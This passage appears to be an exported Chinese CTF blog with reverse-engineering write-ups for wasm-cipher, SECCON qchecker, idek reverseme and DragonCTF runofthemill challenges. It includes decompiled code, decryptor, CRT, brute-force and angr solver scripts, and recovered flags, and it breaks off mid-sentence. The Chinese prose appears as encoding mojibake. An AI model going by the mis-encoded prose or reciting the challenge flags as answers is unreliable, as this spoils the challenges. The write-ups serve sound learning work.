v57))) ^ (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v68); i32_store8(\u0026amp;w2c_memory, v68, v69); // x[a] ^= ROL((x[c] + x[d]), 4) è¿™ä¸ªä¸œè¥¿å¥—åˆ° salsa20 çš„æ¨¡æ¿é‡Œå°±é•¿è¿™ä¸ªæ ·å­\n#define QUARTERROUND(x, a, b, c, d) \\ x[b] ^= ROL(x[a] + x[d], 1); \\ x[c] ^= ROL(x[b] + x[a], 2); \\ x[d] ^= ROL(x[c] + x[b], 3); \\ x[a] ^= ROL(x[d] + x[c], 4); äºæ˜¯é‚£ä¸ª while å¾ªç¯å°±æ˜¯è¿™ä¸ª\nfor(int i = 0; i \u0026lt; 128; i++){ QUARTERROUND(v6+28LL, 0, 4, 8, 12); QUARTERROUND(v6+28LL, 5, 9, 13, 1); QUARTERROUND(v6+28LL, 10, 14, 2, 6); QUARTERROUND(v6+28LL, 15, 3, 7, 11); QUARTERROUND(v6+28LL, 0, 1, 2, 3); QUARTERROUND(v6+28LL, 5, 6, 7, 4); QUARTERROUND(v6+28LL, 10, 11, 8, 9); QUARTERROUND(v6+28LL, 15, 12, 13, 14); } æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹éªŒè¯éƒ¨åˆ†\ni32_store(\u0026amp;w2c_memory, v6 + 8LL, 0LL); while ( (int)i32_load(\u0026amp;w2c_memory, v6 + 8LL) \u0026lt; 16 ) { v30 = i32_load(\u0026amp;w2c_memory, v6 + 32LL); v31 = 4 * i32_load(\u0026amp;w2c_memory, v6 + 20LL); v32 = 2 * i32_load(\u0026amp;w2c_memory, v6 + 8LL) + v31; v33 = w2c_f21(v30, v32); v34 = i32_load8_u(\u0026amp;w2c_memory, v33); v35 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); v36 = i32_load(\u0026amp;w2c_memory, v6 + 8LL) + v35; v55 = (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v36); v37 = i32_load8_u(\u0026amp;w2c_memory, v55 / 16 + 3504LL); v38 = (v34 != v37) | (unsigned int)i32_load(\u0026amp;w2c_memory, v6 + 24LL); i32_store(\u0026amp;w2c_memory, v6 + 24LL, v38); v39 = i32_load(\u0026amp;w2c_memory, v6 + 32LL); v40 = 4 * i32_load(\u0026amp;w2c_memory, v6 + 20LL); v41 = 2 * i32_load(\u0026amp;w2c_memory, v6 + 8LL) + v40; v42 = w2c_f21(v39, v41 + 1); v43 = i32_load8_u(\u0026amp;w2c_memory, v42); v44 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); v45 = i32_load(\u0026amp;w2c_memory, v6 + 8LL) + v44; v3 = (unsigned __int8)i32_load8_u(\u0026amp;w2c_memory, v45) % 16; v46 = i32_load8_u(\u0026amp;w2c_memory, v3 + 3504LL); v47 = (v43 != v46) | (unsigned int)i32_load(\u0026amp;w2c_memory, v6 + 24LL); i32_store(\u0026amp;w2c_memory, v6 + 24LL, v47); v58 = i32_load(\u0026amp;w2c_memory, v6 + 8LL) + 1; i32_store(\u0026amp;w2c_memory, v6 + 8LL, v58); } v59 = i32_load(\u0026amp;w2c_memory, v6 + 20LL) + 8; i32_store(\u0026amp;w2c_memory, v6 + 20LL, v59); } v48 = i32_load(\u0026amp;w2c_memory, v6 + 28LL); w2c_free(v48); v60 = i32_load(\u0026amp;w2c_memory, v6 + 24LL); i32_store(\u0026amp;w2c_memory, v6 + 44LL, v60); } else { LABEL_8: i32_store(\u0026amp;w2c_memory, v6 + 44LL, 0xFFFFFFFFLL); } v49 = i32_load(\u0026amp;w2c_memory, v6 + 44LL); w2c_g0 = v6 + 48; --wasm_rt_call_stack_depth; return v49; } å¾ˆæ˜¾ç„¶ v6+44 å’Œ v6+24 å°±æ˜¯åˆ¤æ–­æ˜¯å¦é€šè¿‡éªŒè¯çš„ï¼Œåªè¦æ¯æ¬¡ (v43 != v46) å’Œ (v34 != v37) ä¸æˆç«‹å°±è¡Œ\næ ¹æ®ä¹‹å‰çš„ç»éªŒï¼Œv6+32 æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆå¯†æ–‡å­—ç¬¦ä¸²åœ°å€ï¼‰ï¼Œv6+20 æ˜¯æœ€å¤–å±‚å¾ªç¯çš„ç´¢å¼•ï¼ˆæ¯æ¬¡ +8ï¼‰ï¼Œv6+8 æ˜¯è¿™å±‚å¾ªç¯çš„æ¬¡æ•°ï¼Œv6+28 æ˜¯ä¸Šä¸€ä¸ªå¾ªç¯åŠ å¯†åçš„ç»“æœ\näºæ˜¯æŠŠè¿™ä¸ªå¾ªç¯ç®€åŒ–ä¸€ä¸‹\nfor (int i = 0; i \u0026lt; len(input); i++){ // ... for (int j = 0; j \u0026lt; 16; j++) { v30 = a3; v31 = 4 * i; v32 = 2 * j + v31; v33 = \u0026amp;v30[v32]; v34 = *v33; v35 = cipher; v36 = \u0026amp;cipher[i]; v55 = *v36; v37 = loc_3504[v55 / 16]; // 3504 ä¸­å­˜çš„æ˜¯ 0-9a-f res |= (v34 != v37); // ååŠéƒ¨åˆ†ç›¸ä¼¼ } } å†ç®€åŒ–ä¸€ä¸‹å°±æ˜¯\nfor (int i = 0; i \u0026lt; strlen(input); i++) { // ... for (int j = 0; j \u0026lt; 16; j++) { v34 = a3[4 * i + 2 * j]; v37 = loc_3504[cipher[i] / 16]; v43 = a3[4 * i + 2 * j + 1]; v46 = loc_3504[cipher[i] % 16]; res |= (v34 != v37) | (v43 != v46); } } æ‰€ä»¥åªéœ€è¦è®©åŠ å¯†ç»“æœè½¬ hex åç­‰äºå¯†æ–‡å³å¯\nåŒæ ·çš„æ–¹æ³•ï¼Œç¿»è¯‘ä¸€ä¸‹ç¬¬ä¸€ä¸ª while å¾ªç¯\nfor (int j = 0; j \u0026lt; 8; j++) { cipher[8 + j] = input[i + j]; } äºæ˜¯æƒ³è¦æ‰¾ä¸€ä¸‹å‰å…«ä½æ˜¯ä»€ä¹ˆï¼Œå‘ç°\nv12 = i32_load(\u0026amp;w2c_memory, v6 + 36LL); v13 = w2c_f20(v12); i32_store(\u0026amp;w2c_memory, v6 + 28LL, v13); äºæ˜¯çŒœæ˜¯æŠŠç¬¬äºŒä¸ªå‚æ•°çš„å‰ 8 å­—èŠ‚å­˜åˆ°äº† cipher çš„å‰ 8 å­—èŠ‚\nè¿™æ ·å°±åˆ†æå®Œäº†æ•´ä¸ªåŠ å¯†æµç¨‹ï¼Œæ¯æ¬¡å– 8 å­—èŠ‚æ˜æ–‡ï¼Œä½¿ç”¨ç±»ä¼¼ salsa åŠ å¯†çš„æ ¸å¿ƒç®—æ³•ï¼Œç”Ÿæˆçš„ç»“æœä¸ hexstring è¿›è¡Œæ¯”è¾ƒ\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #define ROL(a,b) (((a) \u0026lt;\u0026lt; (b)) | ((a) \u0026gt;\u0026gt; (8 - (b)))) #define REQUARTERROUND(x, a, b, c, d) \\ x[a] ^= ROL((x[d] + x[c]) \u0026amp; 0xff, 4); \\ x[d] ^= ROL((x[c] + x[b]) \u0026amp; 0xff, 3); \\ x[c] ^= ROL((x[b] + x[a]) \u0026amp; 0xff, 2); \\ x[b] ^= ROL((x[a] + x[d]) \u0026amp; 0xff, 1); using namespace std; void decrypt(unsigned char * in){ for(int i = 0; i \u0026lt; 128; i++){ REQUARTERROUND(in, 15, 12, 13, 14); REQUARTERROUND(in, 10, 11, 8, 9); REQUARTERROUND(in, 5, 6, 7, 4); REQUARTERROUND(in, 0, 1, 2, 3); REQUARTERROUND(in, 15, 3, 7, 11); REQUARTERROUND(in, 10, 14, 2, 6); REQUARTERROUND(in, 5, 9, 13, 1); REQUARTERROUND(in, 0, 4, 8, 12); } } int main(){ unsigned char enc[] = { 109u, 191u, 132u, 247u, 60u, 246u, 161u, 18u, 38u, 139u, 9u, 82u, 94u, 165u, 80u, 166u, 101u, 226u, 28u, 178u, 227u, 225u, 58u, 247u, 227u, 234u, 14u, 203u, 82u, 245u, 185u, 205u, 165u, 182u, 82u, 43u, 30u, 151u, 135u, 52u, 85u, 63u, 29u, 121u, 86u, 212u, 175u, 148u, 191u, 195u, 244u, 214u, 140u, 143u, 186u, 158u, 238u, 207u, 64u, 53u, 85u, 11u, 145u, 6u, 247u, 13u, 87u, 209u, 166u, 205u, 175u, 50u, 17u, 234u, 170u, 120u, 215u, 26u, 144u, 56u, 183u, 27u, 230u, 33u, 36u, 30u, 139u, 96u, 138u, 67u, 177u, 7u, 248u, 134u, 15u, 84u, 58u, 176u, 24u, 154u, 160u, 99u, 128u, 13u, 228u, 186u, 231u, 208u, 177u, 16u, 69u, 184u }; // å…ˆç”¨ python æŠŠ hexstring è½¬æ¢å›æ¥ for (int i = 0; i \u0026lt; 7; i++) decrypt(enc + i * 16); for(int i = 0; i \u0026lt; 7; i++) for (int j = 8; j \u0026lt; 16; j++) printf(\u0026#34;%c\u0026#34;, enc[16 * i + j]); printf(\u0026#34;\\n\u0026#34;); return 0; } [SECCONCTF 2021]qchecker è¿™é“é¢˜æ˜¯ ruby æ··æ·†\nç¨‹åºçš„ç©ºæ ¼ä¼šæ‹¼æˆ SECCON çš„å­—æ ·\næµ‹è¯•åå‘ç°é”™è¯¯çš„è¾“å…¥ä¼šè®©ç¨‹åºæ‹¼æˆ WRONG. çš„å­—æ ·\næ•´ç†ä¸€ä¸‹æ ¼å¼ï¼Œç†è§£ç¨‹åº\neval$uate=%w( a=%(eval$uate=%w(#{$uate})*\u0026#34;\u0026#34;); Bftjarzs=b=-\u0026gt;a{a.split(?+).map{|b|b.to_i(36)}}; c=b[\u0026#34;awyiv4fjfkuu2pkv+awyiv4fvut716g3j+axce5e4pxrogszr3+5i0omfd5dm9xf9q7+axce5e4khrz21ypr+5htqqi9iasvmjri7+axcc76i03zrn7gu7+cbt4m8xybr3cb27+1ge6snjex10w3si9+1k8vdb4fzcys2yo0\u0026#34;]; d,e,f,g,h,i=b[\u0026#34;0+0+zeexaxq012eg+k2htkr1olaj6+3cbp5mnkzllt3+2qpvamo605t7j\u0026#34;]; (j=eval(?A\u0026lt;\u0026lt;82\u0026lt;\u0026lt;71\u0026lt;\u0026lt;86)[0]) \u0026amp;\u0026amp; d==0 \u0026amp;\u0026amp; ( e+=1;k=2**64;l=-\u0026gt;(a,b){(a-j.ord)*256.pow(b-2,b)%b}; f=l[f,k+13]; g=l[g,k+37]; h=l[h,k+51]; i=l[i,k+81]; j==?}\u0026amp;\u0026amp;(d=e==32\u0026amp;\u0026amp;f+g+h+i==0?2:1); a.sub!(/\u0026#34;0.*?\u0026#34;/,\u0026#39;\u0026#34;0\u0026#39;+[d,e,f,g,h,i].map{|x|x.to_s(36)}*?+\u0026lt;\u0026lt;34) ); srand(f); k=b[\u0026#34;7acw+jsjm+46d84\u0026#34;]; l=d==2?7:6; m=[?#*(l*20)\u0026lt;\u0026lt;10]*11*\u0026#34;\u0026#34;; l.times{ |a|b=d==0\u0026amp;\u0026amp;e!=0?rand(4):0; 9.times{ |e|9.times{ |f|(c[k[d]/10**a%10]\u0026gt;\u0026gt;(e*9+f)\u0026amp;1)!=0 \u0026amp;\u0026amp;( g=f; h=e; b.times{ g,h=h,8-g }; t=(h*l+l+a)*20+h+g*2+2; m[t]=m[t+1]=\u0026#34;\u0026#34;\u0026lt;\u0026lt;32 ) } } }; a.sub!(/B.*?=/,\u0026#34;B=\u0026#34;); n=m.count(?#)-a.length; a.sub!(\u0026#34;B=\u0026#34;,\u0026#34;B#{(1..n).map{(rand(26)+97).chr}*\u0026#34;\u0026#34;}=\u0026#34;); o=0; m.length.times{|b|m[b]==?#\u0026amp;\u0026amp;o\u0026lt;a.length\u0026amp;\u0026amp;(m[b]=a[o];o+=1)}; puts(m) ) * \u0026#34;\u0026#34; å…ˆè¿è¡Œäº†å‡ ä»½ä»£ç åšå¯¹æ¯”ï¼Œå‘ç°åŒºåˆ«ä»…åœ¨äº d,e,f,g,h,i=b[]; è¿™ä¸€è¡Œï¼Œè€Œä¸”åªæœ‰æ‹¼æˆ WRONG çš„æ—¶å€™ï¼Œd æ‰æ˜¯ 1ï¼Œe åˆ™ä¸æ–­è‡ªå¢ï¼Œå…¶ä½™éƒ¨åˆ†çš„ç¨‹åºå®Œå…¨ä¸€æ ·ï¼Œæ ¹æ® d==2?7:6; çŒœæµ‹ï¼Œå½“ d ä¸º 2 çš„æ—¶å€™æ­£ç¡®ï¼Œå› ä¸º SECCON å’Œ WRONG. éƒ½æ˜¯ 6 ä¸ªå­—ç¬¦ï¼Œå®Œå…¨ç¬¦åˆ d ä¸ä¸º 2 çš„æƒ…å†µ\næ ¹æ®è¿™ä¸ªçŒœæµ‹ï¼Œsrand(f); ä»¥ä¸‹çš„ä»£ç æ˜¯è´Ÿè´£æ§åˆ¶ç©ºæ ¼æ ·å¼çš„ï¼Œå’ŒéªŒè¯æ²¡æœ‰å…³ç³»ï¼Œä¸è®¸ç®¡\næˆ‘ä»¬éœ€è¦å…³æ³¨çš„åªæœ‰å¦‚ä¸‹å‡½æ•°\nd,e,f,g,h,i=b[\u0026#34;0+0+zeexaxq012eg+k2htkr1olaj6+3cbp5mnkzllt3+2qpvamo605t7j\u0026#34;]; (j=eval(?A\u0026lt;\u0026lt;82\u0026lt;\u0026lt;71\u0026lt;\u0026lt;86)[0]) \u0026amp;\u0026amp; d==0 \u0026amp;\u0026amp; ( e+=1;k=2**64;l=-\u0026gt;(a,b){(a-j.ord)*256.pow(b-2,b)%b}; f=l[f,k+13]; g=l[g,k+37]; h=l[h,k+51]; i=l[i,k+81]; j==?}\u0026amp;\u0026amp;(d=e==32\u0026amp;\u0026amp;f+g+h+i==0?2:1); a.sub!(/\u0026#34;0.*?\u0026#34;/,\u0026#39;\u0026#34;0\u0026#39;+[d,e,f,g,h,i].map{|x|x.to_s(36)}*?+\u0026lt;\u0026lt;34) ); æ ¹æ®æµ‹è¯• j=eval(?A\u0026lt;\u0026lt;82\u0026lt;\u0026lt;71\u0026lt;\u0026lt;86)[0] æ˜¯è·å–å‘½ä»¤è¡Œå‚æ•°ï¼Œä¹Ÿå°±æ˜¯å½“å‰ä¼ å…¥çš„å­—ç¬¦\nl å‡½æ•°å°±æ˜¯ (a - ord(j)) * invmod(256) % b\næŠŠè¿™ä¸ªç¨‹åºå€’è¿‡æ¥å°±æ˜¯ (a * 256 + ord(j)) % b\nå¦‚æœä¸è€ƒè™‘ % bï¼Œæœ€åå¾—åˆ°çš„å°±æ˜¯ç±»ä¼¼ n2s(flag[::-1]) çš„æ•ˆæœ\næ‰€ä»¥ f, g, h, i çš„åˆå€¼å°±æ˜¯ n2s(flag[::-1]) % (k+?)ï¼Œæ ‡å‡†çš„ä¸­å›½å‰©ä½™å®šç†\na = [4659461645708163688, 2641556351334323346, 15837377083725718695, 12993509283917003551] m = [(2 ** 64 + 13) , (2 ** 64 + 37), (2 ** 64 + 51), (2 ** 64 + 81) ] def gcd(x, y): while y != 0: x, y = y, x % y return abs(x) def ex_gcd(x, y): list_x = [x, 1, 0] list_y = [y, 0, 1] while list_y[0] != 0: r = list_x[0] // list_y[0] for i in range(3): list_x[i] -= r * list_y[i] list_x, list_y = list_y, list_x if list_x[0] \u0026lt; 0: list_x[0], list_x[1], list_x[2] = -list_x[0], -list_x[1], -list_x[2] return list_x def inverse(a, n): if n \u0026lt; 2: raise ValueError(\u0026#34;n \u0026lt; 2, error\u0026#34;) g, x, y = ex_gcd(a, n) if g != 1: print (\u0026#34;gcd(a, n) != 1, no inverse modular\u0026#34;) return x % n def ex_crt(a, m, k): for i in range(1, k): t = gcd(m[i], m[i - 1]) if (a[i] - a[i - 1]) % t != 0: return -1 a[i] = (inverse(m[i - 1] // t, m[i] // t) * (a[i] - a[i - 1]) // t) % (m[i] // t) * m[i - 1] + a[i - 1] m[i] = m[i] // t * m[i - 1] a[i] = (a[i] % m[i] + m[i]) % m[i] return a[-1] from libnum import * n2s(ex_crt(a, m, 4))[::-1] # b\u0026#39;SECCON{L3t5_wr1t3_y0ur_Qu1n3!!!}\u0026#39; [idek]reverseme æºç¨‹åºæ˜¯\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main(int argc, char** argv) { if(argc != 2){ printf(\u0026#34;Usage: ./reverseme password\\n\u0026#34;); return 1; } if(strlen(argv[1])!=14){ printf(\u0026#34;Incorrect Length\\n\u0026#34;); return 1; } if(*argv[1] != 112){//Not enough precision printf(\u0026#34;Password Incorrect\\n\u0026#34;); return 1; } double magic_numbers[7] ={ -68822144.50341525673866271972656250000000000000000000000000, 56777293.39031631499528884887695312500000000000000000000000, -3274524.75536667229607701301574707031250000000000000000000, -85761.51255339206545613706111907958984375000000000000000, 8443.33244327564352715853601694107055664062500000000000, -166.67369627952575683593750000000000000000000000000000, 1.00000000000000000000000000000000000000000000000000, }; for(int i = 0; i \u0026lt; 6;i++){ double foo=1.0,bar=0.0; for(int j=0;j\u0026lt;7;j++){ bar += magic_numbers[j] * foo; foo *= (float)log(*(float*)((unsigned long)argv[1]+2*i)); } if((int)(100000*bar) != 0){ printf(\u0026#34;Password Incorrect\\n\u0026#34;); return 0; } } printf(\u0026#34;Password Correct\\n\u0026#34;); return 0; } ç›¸åŒçš„å…­æ¬¡æ–¹ç¨‹ï¼Œåˆ†åˆ«å¸¦å…¥ flag[0:4], flag[2:6], flag[4:8]...ï¼ŒçŸ¥é“ç¬¬ä¸€ä½ï¼Œäºæ˜¯è€ƒè™‘ç›´æ¥çˆ†ç ´\nå…ˆä¿®æ”¹ä¸€ä¸‹æºä»£ç \n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main(int argc, char** argv) { if(argc != 2){ printf(\u0026#34;Usage: ./reverseme password\\n\u0026#34;); return 1; } // if(strlen(argv[1])!=14){ // printf(\u0026#34;Incorrect Length\\n\u0026#34;); // return 1; // } // if(*argv[1] != 112){//Not enough precision // printf(\u0026#34;Password Incorrect\\n\u0026#34;); // return 1; // } double magic_numbers[7] ={ -68822144.50341525673866271972656250000000000000000000000000, 56777293.39031631499528884887695312500000000000000000000000, -3274524.75536667229607701301574707031250000000000000000000, -85761.51255339206545613706111907958984375000000000000000, 8443.33244327564352715853601694107055664062500000000000, -166.67369627952575683593750000000000000000000000000000, 1.00000000000000000000000000000000000000000000000000, }; // for(int i = 0; i \u0026lt; 6;i++){ int i = 0; double foo=1.0,bar=0.0; for(int j=0;j\u0026lt;7;j++){ bar += magic_numbers[j] * foo; foo *= (float)log(*(float*)((unsigned long)argv[1]+2*i)); } if((int)(100000*bar) != 0){ printf(\u0026#34;Password Incorrect\\n\u0026#34;); return 0; } // } printf(\u0026#34;Password Correct\\n\u0026#34;); return 0; } ç„¶å python è„šæœ¬è¿›è¡Œçˆ†ç ´\nimport string import subprocess charset = string.ascii_letters + string.digits + \u0026#34;!@#$%^_\u0026#34; # pre = \u0026#39;p\u0026#39; # for a in charset: # for b in charset: # for c in charset: # command = \u0026#34;./reverseme_1 p\u0026#34; + a + b + c # output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE) # if b\u0026#34;Correct\u0026#34; in output: # print (\u0026#34;p\u0026#34; + a + b + c) pre = \u0026#34;zf\u0026#34; # æ¯æ¬¡ä¿®æ”¹ä¸€ä¸‹ pre å°±å¯ä»¥è¿›è¡Œçˆ†ç ´äº† # pfTw # pLzf zfTw # p0%Y %Yn@ n@M1 M1aL aLzf zfTw # p@M1 for a in charset: for b in charset: command = \u0026#34;./reverseme_1 \u0026#34; + pre + a + b output = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE) if b\u0026#34;Correct\u0026#34; in output: print (pre + a + b) ä¸Šé¢ç”¨æ¥çˆ†ç ´ p å¼€å¤´çš„ï¼Œå…±æœ‰å››ç§å¯èƒ½ï¼Œä¾æ¬¡çˆ†ç ´å°±è¡Œ\næœ€åå¾—åˆ° flag: p0%Yn@M1aLzfTw\n","date":"2021-12-13T19:37:54+08:00","image":"/post/all-solves-during-a-weekend/cover_hu9fbd6f3e94fcae560a952561592fc022_254866_120x120_fill_q75_box_smart1.jpg","permalink":"/post/all-solves-during-a-weekend/","title":"All Solves During a Weekend"},{"content":"é¢˜ç›®åˆ†æ è·å–è¾“å…¥\nv1 = sys_read(0, byte_412000, 0x40uLL); ä¸­é—´è®¡ç®—\nbyte_412000[42] = __ROR1__(byte_412000[42], 4); *(_DWORD *)\u0026amp;byte_412000[44] ^= 0x4EC10FC6u; *(_WORD *)\u0026amp;byte_412000[15] ^= 0xEBFFu; *(_DWORD *)\u0026amp;byte_412000[38] -= 1698263770; // ä»¥ä¸‹çœç•¥ æœ€åçš„éªŒè¯\nv9 = byte_412000; v10 = byte_412050; v11 = 64LL; v12 = 0; do { v12 |= *v10++ ^ *v9++; --v11; } while ( v11 ); Angræ±‚è§£ è¿˜æ˜¯å¾ˆå®¹æ˜“çœ‹æ‡‚çš„ï¼Œä¸»è¦æ˜¯å¦‚ä½•æ±‚è§£\nä¸€ç§æ€è·¯æ˜¯æŠŠæ±‡ç¼–åè¿‡æ¥ï¼Œpizzaçˆ·ç”¨çš„æ˜¯è¿™ç§åšæ³•ï¼Œäºæ˜¯å°±å†™äº†ä¸ªAngrå–èŒ¶å»äº†\nAngrç”¨çš„æ˜¯æ‰‹åŠ¨å¾€å…¨å±€å˜é‡æ³¨å…¥ç¬¦å·ï¼Œç„¶ååœ¨éªŒè¯å‰åœæ­¢ï¼Œæ‰‹åŠ¨æ·»åŠ çº¦æŸï¼Œwpä¸­çš„å†™æ³•æ˜¯ç›´æ¥ç”¨ç¨‹åºä¸­çš„éªŒè¯ï¼Œå¹¶æ·»åŠ äº† LAZY_SOLVES å‚æ•°ï¼Œå­¦åˆ°äº†\nä¹‹å‰ç”¨è‡ªå·±è„šæœ¬è·‘çš„é€‚åˆå‘ç°ä¸€ç›´æ˜¯ unsatï¼Œä»¥ä¸ºAngrä¼šæœ‰é—®é¢˜ï¼Œä½†åæ¥å‘ç°æœ‰ä¸ªwpå°±æ˜¯ç”¨çš„Angr\näºæ˜¯æå‡ºäº†ä¹‹å‰å†™çš„è„šæœ¬åšäº†ä¸€äº›å°è¯•\nfrom angr import * import claripy import binascii input_length = 56 base_addr = 0x400000 proj = Project(\u0026#39;runofthemill\u0026#39;, main_opts={\u0026#34;base_addr\u0026#34;: base_addr}) start_addr = 0x401054 state = proj.factory.blank_state(addr = start_addr, add_options={options.LAZY_SOLVES}) # state.regs.rdi = 0x412000 user_input = [claripy.BVS(\u0026#39;input_%d\u0026#39; % i, 8) for i in range(input_length)] mem_addr = 0x412000 for i in range(input_length): state.memory.store(mem_addr + i, user_input[i]) state.add_constraints(state.memory.load(mem_addr, 6) == int(binascii.hexlify(b\u0026#34;DrgnS{\u0026#34;), 16)) simgr = proj.factory.simgr(state) find_addr = 0x4117FF simgr.explore(find = find_addr) ans = [ 0xB5, 0x9C, 0x9A, 0x08, 0x68, 0x91, 0x29, 0x0F, 0xBD, 0x1E, 0xFB, 0x71, 0xF4, 0x93, 0x5C, 0xDA, 0x0D, 0x94, 0x10, 0x77, 0x6C, 0x41, 0x8D, 0xE2, 0x5E, 0x26, 0xA5, 0x0A, 0x95, 0xE1, 0x14, 0xDB, 0x25, 0x0B, 0x09, 0xE4, 0x7B, 0xE7, 0x07, 0x71, 0x4E, 0xD3, 0xF2, 0xC1, 0x5C, 0xB2, 0xB4, 0x17, 0x30, 0xAA, 0x3D, 0x35, 0x1E, 0x98, 0xC4, 0x92, 0xF4, 0x33, 0x69, 0xCC, 0x11, 0xB0, 0xCE, 0xCC ] if simgr.found: print (\u0026#34;end state found\u0026#34;) end_state = simgr.found[0] for i in range(64): end_state.add_constraints(end_state.memory.load(mem_addr + i, 1) == ans[i]) for i in range(input_length): print (end_state.solver.eval(user_input[i], cast_to=bytes).decode(), end=\u0026#39;\u0026#39;) print () else: print (\u0026#34;No result\u0026#34;) æœ€åå‘ç°åªè¦æŠŠ input_length è®¾ç½®ä¸º56åŠä»¥ä¸‹å°±å¯ä»¥ï¼Œå…¶ä»–çš„éƒ½æ˜¯ unsat\ncapstoneå­¦ä¹  TODO\nåç»­å­¦ä¹ ä¸€ä¸‹å†æ¥è¡¥\n","date":"2021-12-10T02:01:06Z","permalink":"/post/dragonctf-runofthemill-writeup/","title":"DragonCTF Runofthemill Writeup"},{"content":"ä¸€äº›ä¿¡å·é‡å‡½æ•°çš„å­¦ä¹  ä¿¡å·é‡çš„æ³¨å†Œåœ¨initå‡½æ•°ä¸­\nv2.sa_handler = (__sighandler_t)sub_400E1D; v2.sa_flags = 4; sigaction(34, \u0026amp;v2, \u0026amp;v1); sigaction() å‡½æ•°å®šä¹‰ä¸º\nint sigaction(int signum, const struct sigaction *act, struct sigaction *oldact); sigaction ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹\nstruct sigaction { void (*sa_handler) (int); sigset_t sa_mask; int sa_flags; // ç”¨æ¥è®¾ç½®ä¿¡å·å¤„ç†çš„ç›¸å…³æ“ä½œ void (*sa_restorer) (void); } å…³äº sa_flags çš„å®šä¹‰å¦‚ä¸‹ (from linux/include/uapi/asm-generic/signal-defs.h)\n#ifndef SA_NOCLDSTOP #define SA_NOCLDSTOP\t0x00000001 #endif #ifndef SA_NOCLDWAIT #define SA_NOCLDWAIT\t0x00000002 #endif #ifndef SA_SIGINFO #define SA_SIGINFO\t0x00000004 #endif /* 0x00000008 used on alpha, mips, parisc */ /* 0x00000010 used on alpha, parisc */ /* 0x00000020 used on alpha, parisc, sparc */ /* 0x00000040 used on alpha, parisc */ /* 0x00000080 used on parisc */ /* 0x00000100 used on sparc */ /* 0x00000200 used on sparc */ #define SA_UNSUPPORTED\t0x00000400 #define SA_EXPOSE_TAGBITS\t0x00000800 /* 0x00010000 used on mips */ /* 0x00800000 used for internal SA_IMMUTABLE */ /* 0x01000000 used on x86 */ /* 0x02000000 used on x86 */ /* * New architectures should not define the obsolete *\tSA_RESTORER\t0x04000000 */ #ifndef SA_ONSTACK #define SA_ONSTACK\t0x08000000 #endif #ifndef SA_RESTART #define SA_RESTART\t0x10000000 #endif #ifndef SA_NODEFER #define SA_NODEFER\t0x40000000 #endif #ifndef SA_RESETHAND #define SA_RESETHAND\t0x80000000 #endif é¢˜ç›®ä¸­ä½¿ç”¨çš„æ˜¯ SA_SIGINFOï¼Œå¯¹ä¿¡å·å¤„ç†ç¨‹åºæä¾›äº†é™„åŠ ä¿¡æ¯ï¼šä¸€ä¸ªæŒ‡å‘ siginfo ç»“æ„çš„æŒ‡é’ˆä»¥åŠä¸€ä¸ªæŒ‡å‘ä¸Šä¸‹æ–‡æ ‡è¯†ç¬¦çš„æŒ‡é’ˆ\næ¯”å¦‚ä¸Šè¿°éƒ¨åˆ†å°±æ˜¯å°† sub_400E1D å‡½æ•°æ³¨å†Œä¸º34ä¿¡å·çš„å¤„ç†å‡½æ•°\nä¸»ç¨‹åºä¸­ï¼Œä¸º 2 ä¿¡å·æ³¨å†Œäº†ä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç”¨äºå¯¹æœ€ç»ˆåŠ å¯†ç»“æœè¿›è¡Œåˆ¤æ–­çš„ï¼Œéšåè¿›è¡Œäº†ä¸€ä¸ªåˆå§‹åŒ–ï¼Œæ¥ä¸‹æ¥è¿›å…¥ä¸€ä¸ªæ­»å¾ªç¯ï¼Œç­‰å¾…å­ç¨‹åºå‘é€ 2 ä¿¡å·\næ¥ä¸‹æ¥éœ€è¦äº†è§£æ˜¯å¦‚ä½•è¯»å–æŒ‡ä»¤çš„\nå­ç¨‹åºä¸­è°ƒç”¨äº†å‡½æ•° sub_400A0D(dword_4019C0, s1);ï¼Œå…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯vmçš„æŒ‡ä»¤ç ï¼Œs1æ˜¯è¾“å…¥çš„ flag\nè¿™ä¸ªå‡½æ•°æ˜¯ç”± while å¾ªç¯å’Œ switch è¯­å¥å®ç°çš„\nv41 = a1[(unsigned __int8)qword_6030C8[20]]; if ( v41 == 23 ) break; ++qword_6030C8[20]; è¿™é‡Œå¯ä»¥çœ‹å‡ºæ¥ a1 å­˜å‚¨äº†vmç¨‹åºçš„æœºå™¨ç ï¼Œqword_6030C8[20] å­˜æ”¾çš„æ˜¯ eip\nswitch ( v41 ) { case 0: case 8: case 9: case 10: case 12: case 13: case 14: case 17: case 19: case 20: v2 = qword_6030C8[20]; qword_6030C8[20] = v2 + 1; *v42 = a1[v2]; break; default: break; } è¿™ä¸ª switch ä¸­åˆ¤æ–­æŒ‡ä»¤ç æ˜¯å¦ä¸º 0, 8, 9 ...ï¼Œå¦‚æœæ˜¯ï¼Œå°†ä¼šè¿›è¡Œ eip+1 çš„æ“ä½œï¼Œå¹¶å†ä»æœºå™¨ç ä¸­å–å‡ºä¸€ä½ï¼Œè¯´æ˜è¿™äº›æŒ‡ä»¤å«æœ‰å‚æ•°\næ¥ä¸‹æ¥é€‰æ‹©å‡ ä¸ªæŒ‡ä»¤ï¼Œåˆ†ææ˜¯å¦‚ä½•ä¼ å‚çš„\ncase 0: v3 = getppid(); sigqueue(v3, 34, (const union sigval)v42); break; 0 æŒ‡ä»¤å‘é€äº† 34 ä¿¡å·é‡ï¼Œå°†å‚æ•°è®¾ç½®ä¸º sigval è¿›è¡Œä¼ é€’ï¼Œè¿™ä¸ªæŒ‡ä»¤ä»…ä¼ é€’äº†ä¸€ä¸ªæŒ‡ä»¤å‚æ•°\ncase 1: val = qword_6030C8 + 16; v4 = getppid(); sigqueue(v4, 34, (const union sigval)val); break; case 2: vala = 